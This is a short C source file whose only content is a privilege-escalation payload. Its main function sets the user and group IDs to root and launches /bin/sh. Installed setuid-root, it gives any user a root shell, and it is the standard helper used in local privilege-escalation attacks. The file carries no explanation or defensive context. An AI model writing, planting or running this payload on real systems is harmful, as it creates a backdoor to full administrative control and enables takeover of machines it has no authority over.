#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
	setuid(0);setgid(0);system("/bin/sh");
}


